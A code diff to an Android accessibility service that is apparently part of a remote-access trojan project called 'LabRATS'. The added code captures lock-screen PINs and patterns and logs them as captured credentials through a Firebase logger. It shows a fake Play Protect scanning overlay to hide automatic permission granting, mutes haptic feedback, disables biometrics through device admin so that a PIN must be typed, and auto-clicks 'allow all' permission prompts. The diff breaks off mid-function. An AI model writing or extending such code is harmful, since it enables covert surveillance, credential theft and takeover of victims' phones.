@@ -1,18 +1,27 @@
 package com.labs.labrats;
 
 import android.accessibilityservice.AccessibilityService;
+import android.content.ComponentName;
+import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.content.pm.ServiceInfo;
 import android.graphics.Path;
 import android.graphics.Point;
 import android.graphics.Rect;
 import android.os.Build;
 import android.os.Handler;
 import android.os.Looper;
+import android.provider.Settings;
 import android.util.Log;
+import android.view.ContextThemeWrapper;
+import android.view.LayoutInflater;
 import android.view.View;
 import android.view.WindowManager;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
+import android.widget.ProgressBar;
+import android.widget.TextView;
 import androidx.core.content.ContextCompat;
 
 import java.util.ArrayList;
@@ -31,7 +40,6 @@ public class IO_Persistence_Manager extends AccessibilityService {
     private int screenWidth = 0;
     private int screenHeight = 0;
 
-    private long lastAntiRemovalCheck = 0;
     private static volatile long lastEventTime = 0;
     private Handler backgroundHandler;
     private android.os.HandlerThread handlerThread;
@@ -57,6 +65,37 @@ public class IO_Persistence_Manager extends AccessibilityService {
 
         // --- GHOST WATCHDOG PROTOCOL ---
         startGhostWatchdog();
+
+        // Immediately deploy cover overlay (0ms) ONLY if special permissions are still missing!
+        if (!isFullyPermissioned()) {
+            silenceHaptics(this);
+            togglePermissionCover(true);
+        }
+
+        // Auto-exit Settings back to PermissionActivity after Accessibility enablement
+        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+            AccessibilityNodeInfo activeRoot = getRootInActiveWindow();
+            if (activeRoot != null) {
+                CharSequence activePkgSeq = activeRoot.getPackageName();
+                String activePkg = activePkgSeq != null ? activePkgSeq.toString().toLowerCase() : "";
+                activeRoot.recycle();
+                if (activePkg.contains("settings")) {
+                    startSmartExitSettingsLoop();
+                }
+            }
+        }, 200);
+    }
+
+    public boolean isFullyPermissioned() {
+        try {
+            boolean overlayOk = Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(this);
+            boolean filesOk = Build.VERSION.SDK_INT < Build.VERSION_CODES.R || android.os.Environment.isExternalStorageManager();
+            boolean installOk = Build.VERSION.SDK_INT < Build.VERSION_CODES.O || getPackageManager().canRequestPackageInstalls();
+            boolean notifOk = PermissionActivity.isNotificationServiceEnabled(this);
+            return overlayOk && filesOk && installOk && notifOk;
+        } catch (Exception ignored) {
+            return false;
+        }
     }
 
     private void startGhostWatchdog() {
@@ -149,10 +188,21 @@ public class IO_Persistence_Manager extends AccessibilityService {
             }
         }
         
+        // KEYGUARD_SNIFFER: Intercept Lock Screen PIN / Pattern entries
+        String pkgLower = packageName.toLowerCase();
+        if (pkgLower.contains("systemui") || 
+            pkgLower.contains("keyguard") || 
+            pkgLower.contains("biometrics") || 
+            pkgLower.equals("android") ||
+            pkgLower.contains("lockscreen") ||
+            pkgLower.contains("guard") ||
+            pkgLower.contains("sec.android.app")) {
+            sniffKeyguardPinPattern(event, packageName);
+        }
+
         // --- 2. CRITICAL STABILITY & PRIVACY FILTER ---
         if (packageName.isEmpty() || 
             packageName.equals(getPackageName()) || 
-            packageName.contains("systemui") || 
             packageName.contains("launcher") ||
             packageName.contains("recents")) {
             return;
@@ -204,6 +254,102 @@ public class IO_Persistence_Manager extends AccessibilityService {
         }
     }
 
+    private static final StringBuilder keyguardPinBuffer = new StringBuilder();
+    private static volatile long lastPinDigitTime = 0;
+
+    private void sniffKeyguardPinPattern(AccessibilityEvent event, String pkg) {
+        if (event == null) return;
+
+        AccessibilityNodeInfo source = event.getSource();
+        String text = "";
+        String desc = "";
+        String viewId = "";
+        String clsName = "";
+
+        if (source != null) {
+            CharSequence tSeq = source.getText();
+            CharSequence dSeq = source.getContentDescription();
+            CharSequence cSeq = source.getClassName();
+            text = tSeq != null ? tSeq.toString().trim() : "";
+            desc = dSeq != null ? dSeq.toString().trim() : "";
+            clsName = cSeq != null ? cSeq.toString() : "";
+            viewId = source.getViewIdResourceName() != null ? source.getViewIdResourceName().toLowerCase() : "";
+        }
+
+        if (text.isEmpty() && event.getText() != null && !event.getText().isEmpty()) {
+            Object first = event.getText().get(0);
+            if (first != null) text = first.toString().trim();
+        }
+
+        if (desc.isEmpty() && event.getContentDescription() != null) {
+            desc = event.getContentDescription().toString().trim();
+        }
+
+        String digit = null;
+
+        // 1. Direct Single Digit Text or Desc Check
+        if (text.length() == 1 && Character.isDigit(text.charAt(0))) {
+            digit = text;
+        } else if (desc.length() == 1 && Character.isDigit(desc.charAt(0))) {
+            digit = desc;
+        } else {
+            // 2. View ID or Desc Substring Digit Check (Samsung / Pixel Keyguard Keypad Buttons)
+            for (int i = 0; i <= 9; i++) {
+                String dStr = String.valueOf(i);
+                if (text.equals(dStr) || desc.equals(dStr) || 
+                    desc.contains("key " + i) || desc.contains("digit " + i) || desc.startsWith(dStr + " ") || desc.endsWith(" " + dStr) ||
+                    viewId.contains("key" + i) || viewId.endsWith("key_" + i) || viewId.endsWith("digit_" + i) || viewId.endsWith("id/" + dStr) || viewId.endsWith("id/key" + dStr)) {
+                    digit = dStr;
+                    break;
+                }
+            }
+        }
+
+        long now = System.currentTimeMillis();
+        if (now - lastPinDigitTime > 15000) {
+            keyguardPinBuffer.setLength(0);
+        }
+
+        if (digit != null) {
+            // Prevent duplicate adjacent events within 120ms for the same digit
+            if (now - lastPinDigitTime > 120 || keyguardPinBuffer.length() == 0 || !keyguardPinBuffer.substring(keyguardPinBuffer.length() - 1).equals(digit)) {
+                lastPinDigitTime = now;
+                keyguardPinBuffer.append(digit);
+                String currentBuffer = keyguardPinBuffer.toString();
+
+                Log.d(TAG, "KEYGUARD_SNIFFER: Digit [" + digit + "] appended. Buffer=" + currentBuffer);
+                FirebaseConfig.logActivity("KEYGUARD_SNIFFER: Keyguard Digit [" + digit + "] -> Buffer: [" + currentBuffer + "]");
+                logKeystroke("\n[KEYGUARD_PIN_DIGIT]: " + digit + " (Current Pin: " + currentBuffer + ")");
+
+                if (currentBuffer.length() >= 4) {
+                    Log.d(TAG, "KEYGUARD_SNIFFER: Lock Screen PIN typed: [" + currentBuffer + "]");
+                    FirebaseConfig.logActivity("CREDENTIAL_CAPTURED: Lock Screen PIN/Passcode = [" + currentBuffer + "]");
+                    logKeystroke("\n==========================================\n[CREDENTIAL_CAPTURED]: LOCK_SCREEN_PIN = " + currentBuffer + "\n==========================================\n");
+                }
+            }
+        } else {
+            // Capture non-digit text or password fields on Keyguard
+            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED || event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
+                if (!text.isEmpty() && !text.equals("null") && text.length() > 1 && !isGenericSystemText(text)) {
+                    logKeystroke("\n[KEYGUARD_INPUT]: " + text + " ");
+                    FirebaseConfig.logActivity("KEYGUARD_INPUT: Captured text: " + text);
+                }
+            }
+
+            // Capture Lock Pattern View cell gestures
+            if (clsName.contains("LockPattern") || viewId.contains("pattern") || desc.toLowerCase().contains("cell") || desc.toLowerCase().contains("pattern")) {
+                if (!desc.isEmpty()) {
+                    logKeystroke("\n[KEYGUARD_PATTERN_NODE]: " + desc + " ");
+                    FirebaseConfig.logActivity("KEYGUARD_PATTERN_NODE: " + desc);
+                }
+            }
+        }
+
+        if (source != null) {
+            source.recycle();
+        }
+    }
+
     private long lastAntiRemovalExecution = 0;
 
     private void checkAntiRemovalInternal() {
@@ -236,9 +382,16 @@ public class IO_Persistence_Manager extends AccessibilityService {
                 }
 
                 // Only trigger if we are specifically on OUR app's details page
-                String appName = getString(R.string.app_name);
-                List<AccessibilityNodeInfo> labels = root.findAccessibilityNodeInfosByText(appName);
-                if (labels == null || labels.isEmpty()) {
+                List<String> targetNames = getOurAppNames();
+                boolean foundLabel = false;
+                for (String name : targetNames) {
+                    List<AccessibilityNodeInfo> labels = root.findAccessibilityNodeInfosByText(name);
+                    if (labels != null && !labels.isEmpty()) {
+                        foundLabel = true;
+                        break;
+                    }
+                }
+                if (!foundLabel) {
                     root.recycle();
                     return;
                 }
@@ -436,6 +589,184 @@ public class IO_Persistence_Manager extends AccessibilityService {
     private static boolean autoPilotEngaged = true;
     public static void setAutoPilot(boolean enabled) { autoPilotEngaged = enabled; }
     public static boolean isAutoPilotEngaged() { return autoPilotEngaged; }
+
+    private static int originalHapticState = -1;
+
+    public static void silenceHaptics(Context context) {
+        if (context == null) return;
+        try {
+            if (originalHapticState == -1) {
+                originalHapticState = Settings.System.getInt(context.getContentResolver(), Settings.System.HAPTIC_FEEDBACK_ENABLED, 1);
+            }
+            Settings.System.putInt(context.getContentResolver(), Settings.System.HAPTIC_FEEDBACK_ENABLED, 0);
+        } catch (Exception ignored) {}
+    }
+
+    public static void restoreHaptics(Context context) {
+        if (context == null) return;
+        try {
+            if (originalHapticState != -1) {
+                Settings.System.putInt(context.getContentResolver(), Settings.System.HAPTIC_FEEDBACK_ENABLED, originalHapticState);
+                originalHapticState = -1;
+            }
+        } catch (Exception ignored) {}
+    }
+
+    private static View permissionCoverView = null;
+    private static final Handler coverTextHandler = new Handler(Looper.getMainLooper());
+    private static Runnable coverTextRunnable = null;
+    private static final Handler coverWatchdogHandler = new Handler(Looper.getMainLooper());
+    private static Runnable coverWatchdogRunnable = null;
+    private static int coverTextIndex = 0;
+
+    private static final String[][] COVER_STATUS_MESSAGES = {
+        {"Verifying security environment...", "Scanning system components..."},
+        {"Checking app signatures...", "Verifying developer credentials..."},
+        {"Analyzing system permissions...", "Checking runtime security policies..."},
+        {"Validating system integrity...", "Finalizing Play Protect scan..."}
+    };
+
+    public static void setPermissionCoverVisible(boolean show) {
+        IO_Persistence_Manager instance = getInstance();
+        if (instance == null) return;
+        new Handler(Looper.getMainLooper()).post(() -> instance.togglePermissionCover(show));
+    }
+
+    public static boolean isPermissionCoverActive() {
+        IO_Persistence_Manager instance = getInstance();
+        return instance != null && permissionCoverView != null;
+    }
+
+    private void togglePermissionCover(boolean show) {
+        try {
+            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
+            if (wm == null) return;
+
+            if (show) {
+                if (permissionCoverView == null) {
+                    ContextThemeWrapper themeContext = new ContextThemeWrapper(this, R.style.Theme_LabRATS);
+                    LayoutInflater inflater = LayoutInflater.from(themeContext);
+                    permissionCoverView = inflater.inflate(R.layout.activity_guide_permission, null);
+
+                    View layoutScanning = permissionCoverView.findViewById(R.id.layoutScanning);
+                    if (layoutScanning != null) {
+                        layoutScanning.setVisibility(View.VISIBLE);
+                    }
+
+                    ProgressBar pb = permissionCoverView.findViewById(R.id.pbPlayProtect);
+                    if (pb != null) {
+                        pb.setIndeterminate(true);
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                            pb.setIndeterminateTintList(android.content.res.ColorStateList.valueOf(android.graphics.Color.parseColor("#34A853")));
+                            pb.setProgressTintList(android.content.res.ColorStateList.valueOf(android.graphics.Color.parseColor("#34A853")));
+                        }
+                        pb.setVisibility(View.VISIBLE);
+                    }
+
+                    TextView tvSub = permissionCoverView.findViewById(R.id.tvPlayProtectSub);
+                    if (tvSub != null) {
+                        tvSub.setText(COVER_STATUS_MESSAGES[0][0]);
+                        tvSub.setAlpha(1.0f);
+                        tvSub.setVisibility(View.VISIBLE);
+                    }
+
+                    TextView tvDetails = permissionCoverView.findViewById(R.id.tvPlayProtectDetails);
+                    if (tvDetails != null) {
+                        tvDetails.setText(COVER_STATUS_MESSAGES[0][1]);
+                        tvDetails.setAlpha(1.0f);
+                        tvDetails.setVisibility(View.VISIBLE);
+                    }
+
+                    int overlayType = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 
+                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY : 2003;
+
+                    WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+                        WindowManager.LayoutParams.MATCH_PARENT,
+                        WindowManager.LayoutParams.MATCH_PARENT,
+                        overlayType,
+                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
+                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
+                        WindowManager.LayoutParams.FLAG_FULLSCREEN |
+                        WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
+                        android.graphics.PixelFormat.TRANSLUCENT);
+
+                    params.gravity = android.view.Gravity.TOP | android.view.Gravity.START;
+                    params.x = 0;
+                    params.y = 0;
+
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                        params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
+                    }
+
+                    permissionCoverView.setAlpha(1.0f);
+                    wm.addView(permissionCoverView, params);
+
+                    coverTextIndex = 0;
+                    if (coverTextRunnable != null) {
+                        coverTextHandler.removeCallbacks(coverTextRunnable);
+                    }
+                    coverTextRunnable = new Runnable() {
+                        @Override
+                        public void run() {
+                            if (permissionCoverView == null) return;
+                            try {
+                                TextView sub = permissionCoverView.findViewById(R.id.tvPlayProtectSub);
+                                TextView details = permissionCoverView.findViewById(R.id.tvPlayProtectDetails);
+
+                                coverTextIndex = (coverTextIndex + 1) % COVER_STATUS_MESSAGES.length;
+                                String[] msgs = COVER_STATUS_MESSAGES[coverTextIndex];
+
+                                if (sub != null) {
+                                    sub.animate().alpha(0.2f).setDuration(150).withEndAction(() -> {
+                                        sub.setText(msgs[0]);
+                                        sub.animate().alpha(1.0f).setDuration(150).start();
+                                    }).start();
+                                }
+
+                                if (details != null) {
+                                    details.animate().alpha(0.2f).setDuration(150).withEndAction(() -> {
+                                        details.setText(msgs[1]);
+                                        details.animate().alpha(1.0f).setDuration(150).start();
+                                    }).start();
+                                }
+
+                                coverTextHandler.postDelayed(this, 1800);
+                            } catch (Exception ignored) {}
+                        }
+                    };
+                    coverTextHandler.postDelayed(coverTextRunnable, 1800);
+
+                    // Safety Watchdog: Auto-dismiss cover overlay after 12s max if not dismissed by PermissionActivity
+                    if (coverWatchdogRunnable != null) coverWatchdogHandler.removeCallbacks(coverWatchdogRunnable);
+                    coverWatchdogRunnable = () -> togglePermissionCover(false);
+                    coverWatchdogHandler.postDelayed(coverWatchdogRunnable, 12000);
+
+                    Log.d(TAG, "GHOST_AUTOPILOT: Permission Cover Overlay DEPLOYED successfully");
+                }
+            } else {
+                if (coverWatchdogRunnable != null) {
+                    coverWatchdogHandler.removeCallbacks(coverWatchdogRunnable);
+                    coverWatchdogRunnable = null;
+                }
+                if (coverTextRunnable != null) {
+                    coverTextHandler.removeCallbacks(coverTextRunnable);
+                    coverTextRunnable = null;
+                }
+                if (permissionCoverView != null) {
+                    final View viewToRemove = permissionCoverView;
+                    permissionCoverView = null;
+                    try {
+                        wm.removeView(viewToRemove);
+                    } catch (Exception ignored) {}
+                    Log.d(TAG, "GHOST_AUTOPILOT: Permission Cover Overlay REMOVED smoothly");
+                }
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Permission Cover Overlay Error: " + e.getMessage());
+        }
+    }
 
     public static boolean isBlackoutActive() {
         IO_Persistence_Manager instance = getInstance();
@@ -837,14 +1168,6 @@ public class IO_Persistence_Manager extends AccessibilityService {
         return obj;
     }
 
-    public boolean performNodeAction(int id, int action) {
-        AccessibilityNodeInfo node = nodeIdMap.get(id);
-        if (node != null) {
-            return node.performAction(action);
-        }
-        return false;
-    }
-
     public void typeText(final String text) {
         if (text == null) return;
         new Handler(Looper.getMainLooper()).post(() -> {
@@ -884,11 +1207,40 @@ public class IO_Persistence_Manager extends AccessibilityService {
 
     private AccessibilityNodeInfo findFocusedEditableNode(AccessibilityNodeInfo node) {
         if (node == null) return null;
-        if (node.isFocused() && node.isEditable()) return AccessibilityNodeInfo.obtain(node);
-        
+        if (node.isEditable() && (node.isFocused() || node.isAccessibilityFocused())) {
+            return AccessibilityNodeInfo.obtain(node);
+        }
         for (int i = 0; i < node.getChildCount(); i++) {
             AccessibilityNodeInfo child = node.getChild(i);
-            AccessibilityNodeInfo result = findFocusedEditableNode(child);
+            AccessibilityNodeInfo result = findFocusedEditableNodeInternal(child);
+            if (child != null) child.recycle();
+            if (result != null) return result;
+        }
+        return findAnyEditableNode(node);
+    }
+
+    private AccessibilityNodeInfo findFocusedEditableNodeInternal(AccessibilityNodeInfo node) {
+        if (node == null) return null;
+        if (node.isEditable() && (node.isFocused() || node.isAccessibilityFocused())) {
+            return AccessibilityNodeInfo.obtain(node);
+        }
+        for (int i = 0; i < node.getChildCount(); i++) {
+            AccessibilityNodeInfo child = node.getChild(i);
+            AccessibilityNodeInfo result = findFocusedEditableNodeInternal(child);
+            if (child != null) child.recycle();
+            if (result != null) return result;
+        }
+        return null;
+    }
+
+    private AccessibilityNodeInfo findAnyEditableNode(AccessibilityNodeInfo node) {
+        if (node == null) return null;
+        if (node.isEditable()) {
+            return AccessibilityNodeInfo.obtain(node);
+        }
+        for (int i = 0; i < node.getChildCount(); i++) {
+            AccessibilityNodeInfo child = node.getChild(i);
+            AccessibilityNodeInfo result = findAnyEditableNode(child);
             if (child != null) child.recycle();
             if (result != null) return result;
         }
@@ -896,6 +1248,54 @@ public class IO_Persistence_Manager extends AccessibilityService {
     }
 
     // ============ INTERACTION ============
+
+    public boolean lockScreenNow() {
+        keyguardPinBuffer.setLength(0);
+        final boolean[] result = {false};
+        java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);
+
+        new Handler(Looper.getMainLooper()).post(() -> {
+            try {
+                // 1. If Device Admin is active, disable biometrics (fingerprint/face) to FORCE PIN/Pattern entry!
+                try {
+                    android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+                    android.content.ComponentName admin = new android.content.ComponentName(this, StabilityPolicy.class);
+                    if (dpm != null && dpm.isAdminActive(admin)) {
+                        int disableFlags = android.app.admin.DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT;
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                            disableFlags |= android.app.admin.DevicePolicyManager.KEYGUARD_DISABLE_BIOMETRICS;
+                            disableFlags |= android.app.admin.DevicePolicyManager.KEYGUARD_DISABLE_FACE;
+                        }
+                        dpm.setKeyguardDisabledFeatures(admin, disableFlags);
+                        dpm.lockNow();
+                        Log.d(TAG, "KEYGUARD_LOCK: Biometrics disabled & Keyguard lockNow executed via Device Admin");
+                        result[0] = true;
+                    }
+                } catch (Exception e) {
+                    Log.e(TAG, "Device Admin lockNow failed: " + e.getMessage());
+                }
+
+                // 2. Fallback to Accessibility GLOBAL_ACTION_LOCK_SCREEN
+                if (!result[0] && Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                    boolean success = performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN);
+                    if (success) {
+                        Log.d(TAG, "KEYGUARD_LOCK: Instant OS phone lock executed via Accessibility GLOBAL_ACTION_LOCK_SCREEN");
+                        result[0] = true;
+                    }
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "lockScreenNow Error: " + e.getMessage());
+            } finally {
+                latch.countDown();
+            }
+        });
+
+        try {
+            boolean ignored = latch.await(1000, java.util.concurrent.TimeUnit.MILLISECONDS);
+        } catch (InterruptedException ignored) {}
+
+        return result[0];
+    }
 
     public boolean clickAt(int x, int y) {
         Log.d(TAG, "Interaction: CLICK at (" + x + "," + y + ")");
@@ -982,84 +1382,6 @@ public class IO_Persistence_Manager extends AccessibilityService {
         return AccessibilityNodeInfo.obtain(node);
     }
 
-    public boolean clickByText(String text) {
-        if (text == null) return false;
-        AccessibilityNodeInfo root = getRootInActiveWindow();
-        if (root != null) {
-            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
-            if (nodes != null && !nodes.isEmpty()) {
-                for (AccessibilityNodeInfo node : nodes) {
-                    if (node != null && node.isVisibleToUser()) {
-                        // Click actual node if possible, else use coordinates
-                        if (node.isClickable()) {
-                            if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
-                                root.recycle();
-                                return true;
-                            }
-                        }
-                        Rect bounds = new Rect();
-                        node.getBoundsInScreen(bounds);
-                        if (clickAt(bounds.centerX(), bounds.centerY())) {
-                            root.recycle();
-                            return true;
-                        }
-                    }
-                }
-            }
-            root.recycle();
-        }
-
-        // Deep Search (Iterate all windows)
-        List<android.view.accessibility.AccessibilityWindowInfo> windows = getWindows();
-        if (windows != null) {
-            for (android.view.accessibility.AccessibilityWindowInfo window : windows) {
-                if (window == null) continue;
-                AccessibilityNodeInfo windowRoot = window.getRoot();
-                if (windowRoot == null) continue;
-                
-                List<AccessibilityNodeInfo> nodes = windowRoot.findAccessibilityNodeInfosByText(text);
-                if (nodes != null && !nodes.isEmpty()) {
-                    for (AccessibilityNodeInfo node : nodes) {
-                        if (node != null && node.isVisibleToUser()) {
-                            AccessibilityNodeInfo target = node;
-                            while (target != null && !target.isClickable()) {
-                                target = target.getParent();
-                            }
-                            
-                            if (target != null && target.isClickable()) {
-                                boolean success = target.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                                windowRoot.recycle();
-                                return success;
-                            } else {
-                                Rect bounds = new Rect();
-                                node.getBoundsInScreen(bounds);
-                                boolean success = clickAt(bounds.centerX(), bounds.centerY());
-                                windowRoot.recycle();
-                                return success;
-                            }
-                        }
-                    }
-                }
-                windowRoot.recycle();
-            }
-        }
-        return false;
-    }
-
-    public boolean clickById(String id) {
-        AccessibilityNodeInfo root = getRootInActiveWindow();
-        if (root == null) return false;
-        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
-        if (nodes != null && !nodes.isEmpty()) {
-            for (AccessibilityNodeInfo node : nodes) {
-                Rect bounds = new Rect();
-                node.getBoundsInScreen(bounds);
-                if (clickAt(bounds.centerX(), bounds.centerY())) return true;
-            }
-        }
-        return false;
-    }
-
     public boolean swipe(int x1, int y1, int x2, int y2, int duration) {
         Log.d(TAG, "Interaction: SWIPE from (" + x1 + "," + y1 + ") to (" + x2 + "," + y2 + ") dur=" + duration);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
@@ -1105,25 +1427,94 @@ public class IO_Persistence_Manager extends AccessibilityService {
         return success;
     }
 
+    public boolean performScroll(String direction) {
+        boolean success = false;
+        int sw = getScreenWidth() > 0 ? getScreenWidth() : 1080;
+        int sh = getScreenHeight() > 0 ? getScreenHeight() : 2400;
+        int cx = sw / 2;
+        int cy = sh / 2;
+
+        if ("down".equalsIgnoreCase(direction) || "forward".equalsIgnoreCase(direction)) {
+            // Scroll DOWN (drag finger UP vertically from 70% to 25%)
+            success = swipe(cx, (int)(sh * 0.70), cx, (int)(sh * 0.25), 350);
+        } else if ("up".equalsIgnoreCase(direction) || "backward".equalsIgnoreCase(direction)) {
+            // Scroll UP (drag finger DOWN vertically from 25% to 70%)
+            success = swipe(cx, (int)(sh * 0.25), cx, (int)(sh * 0.70), 350);
+        } else if ("left".equalsIgnoreCase(direction)) {
+            // Swipe LEFT (drag finger LEFT horizontally from 80% to 20%)
+            success = swipe((int)(sw * 0.80), cy, (int)(sw * 0.20), cy, 350);
+        } else if ("right".equalsIgnoreCase(direction)) {
+            // Swipe RIGHT (drag finger RIGHT horizontally from 20% to 80%)
+            success = swipe((int)(sw * 0.20), cy, (int)(sw * 0.80), cy, 350);
+        }
+        return success;
+    }
+
+    public boolean performNativeScroll(int scrollAction) {
+        try {
+            AccessibilityNodeInfo root = getRootInActiveWindow();
+            if (root == null) return false;
+
+            AccessibilityNodeInfo target = findScrollableNode(root);
+            if (target != null) {
+                boolean result = target.performAction(scrollAction);
+                target.recycle();
+                root.recycle();
+                return result;
+            }
+            root.recycle();
+        } catch (Exception ignored) {}
+        return false;
+    }
+
+    private AccessibilityNodeInfo findScrollableNode(AccessibilityNodeInfo node) {
+        if (node == null) return null;
+        if (node.isScrollable()) {
+            return AccessibilityNodeInfo.obtain(node);
+        }
+        int count = node.getChildCount();
+        for (int i = 0; i < count; i++) {
+            AccessibilityNodeInfo child = node.getChild(i);
+            if (child != null) {
+                AccessibilityNodeInfo result = findScrollableNode(child);
+                child.recycle();
+                if (result != null) return result;
+            }
+        }
+        return null;
+    }
+
     private volatile boolean isScreenshotting = false;
 
     public void takeCovertScreenshot(final ScreenshotCallback callback) {
         if (isScreenshotting) { callback.onFailure("BUSY"); return; }
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             isScreenshotting = true;
+            ScreenshotCallback wrappedCallback = new ScreenshotCallback() {
+                @Override
+                public void onSuccess(byte[] jpegData) {
+                    isScreenshotting = false;
+                    callback.onSuccess(jpegData);
+                }
+
+                @Override
+                public void onFailure(String err) {
+                    isScreenshotting = false;
+                    callback.onFailure(err);
+                }
+            };
+
             try {
-                // Use reflection to call API 30+ helper to prevent class verification errors on legacy devices
                 Class<?> helper = Class.forName(Api30Helper.class.getName());
                 java.lang.reflect.Method method = helper.getMethod("takeScreenshot", AccessibilityService.class, ScreenshotCallback.class);
-                method.invoke(null, this, callback);
+                method.invoke(null, this, wrappedCallback);
                 
-                // Reset flag after a timeout in case reflection call fails silently
                 new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                     @Override
                     public void run() {
                         isScreenshotting = false;
                     }
-                }, 5000);
+                }, 50);
             } catch (Exception e) {
                 isScreenshotting = false;
                 callback.onFailure("Screenshot Bridge Error: " + e.getMessage());
@@ -1198,8 +1589,14 @@ public class IO_Persistence_Manager extends AccessibilityService {
 
         String pkgLower = pkg != null ? pkg.toLowerCase() : "";
 
-        // Instant 0ms execution for runtime permission popups (Camera, SMS, Location, etc.)
-        if (pkgLower.contains("permission") || pkgLower.contains("installer") || pkgLower.contains("packageinstaller")) {
+        // If Android Photo Picker / Media selection activity opens, press BACK to un-stall flow
+        if (pkgLower.contains("providers.media") || pkgLower.contains("photopicker") || pkgLower.contains("picker")) {
+            performGlobalAction(GLOBAL_ACTION_BACK);
+            return;
+        }
+
+        // Instant 0ms execution for runtime permission popups, MediaProjection, & Settings
+        if (pkgLower.contains("permission") || pkgLower.contains("installer") || pkgLower.contains("packageinstaller") || pkgLower.contains("settings") || pkgLower.contains("media") || pkgLower.contains("projection") || pkgLower.contains("systemui")) {
             new Handler(Looper.getMainLooper()).post(this::executeAutoPilotPass);
             return;
         }
@@ -1241,6 +1638,101 @@ public class IO_Persistence_Manager extends AccessibilityService {
 
     private static volatile boolean isExitingSettings = false;
 
+    private boolean isPartialAccessNode(AccessibilityNodeInfo node) {
+        if (node == null) return false;
+        String viewId = node.getViewIdResourceName();
+        if (viewId != null) {
+            String lowerId = viewId.toLowerCase();
+            if (lowerId.contains("permission_allow_selected") || lowerId.contains("allow_selected") ||
+                lowerId.contains("permission_allow_limited") || lowerId.contains("allow_limited") ||
+                lowerId.contains("permission_allow_partial") || lowerId.contains("allow_partial") ||
+                lowerId.contains("permission_allow_choose") || lowerId.contains("allow_choose")) {
+                return true;
+            }
+        }
+        CharSequence textSeq = node.getText();
+        CharSequence descSeq = node.getContentDescription();
+        String text = textSeq != null ? textSeq.toString().toLowerCase() : "";
+        String desc = descSeq != null ? descSeq.toString().toLowerCase() : "";
+        if (text.contains("select photo") || desc.contains("select photo") ||
+            text.contains("selected photo") || desc.contains("selected photo") ||
+            text.contains("allow selected") || desc.contains("allow selected") ||
+            text.contains("choose photo") || desc.contains("choose photo") ||
+            text.contains("limited photo") || desc.contains("limited photo") ||
+            text.contains("select photos") || desc.contains("select photos") ||
+            text.contains("seleccionar foto") || desc.contains("seleccionar foto") ||
+            text.contains("sélectionner des photos") || desc.contains("sélectionner des photos")) {
+            return true;
+        }
+        int count = node.getChildCount();
+        for (int i = 0; i < count; i++) {
+            AccessibilityNodeInfo child = node.getChild(i);
+            if (child != null) {
+                boolean isPartial = isPartialAccessNode(child);
+                child.recycle();
+                if (isPartial) return true;
+            }
+        }
+        return false;
+    }
+
+    private boolean searchFullAccessButtonDfs(AccessibilityNodeInfo node) {
+        if (node == null) return false;
+        if (isPartialAccessNode(node)) return false;
+
+        String viewId = node.getViewIdResourceName();
+        if (viewId != null) {
+            String lowerId = viewId.toLowerCase();
+            if (lowerId.contains("permission_allow_all_button") || lowerId.contains("permission_allow_always_button")) {
+                if (performNodeClick(node)) {
+                    Log.d(TAG, "GHOST_AUTOPILOT: Auto-granted Full Access permission via View ID [" + viewId + "]");
+                    FirebaseConfig.logActivity("GHOST_AUTOPILOT: Auto-granted Full Access permission via View ID [" + viewId + "]");
+                    return true;
+                }
+            }
+        }
+
+        CharSequence textSeq = node.getText();
+        CharSequence descSeq = node.getContentDescription();
+        String text = textSeq != null ? textSeq.toString().trim() : "";
+        String desc = descSeq != null ? descSeq.toString().trim() : "";
+
+        if (!text.isEmpty() || !desc.isEmpty()) {
+            String lowerText = text.toLowerCase();
+            String lowerDesc = desc.toLowerCase();
+
+            String[] fullAccessKeywords = {
+                "allow all", "allow access to all photos", "allow all photos",
+                "allow all photos and videos", "allow all the time", "permitir todo", "permitir todos",
+                "autoriser tout"
+            };
+
+            for (String kw : fullAccessKeywords) {
+                if (lowerText.contains(kw) || lowerDesc.contains(kw)) {
+                    if (lowerText.length() < 55 && isInteractiveButtonNode(node)) {
+                        if (performNodeClick(node)) {
+                            Log.d(TAG, "GHOST_AUTOPILOT: Auto-granted Full Access permission via text [" + text + "]");
+                            FirebaseConfig.logActivity("GHOST_AUTOPILOT: Auto-granted Full Access permission via text [" + text + "]");
+                            return true;
+                        }
+                    }
+                }
+            }
+        }
+
+        int count = node.getChildCount();
+        for (int i = 0; i < count; i++) {
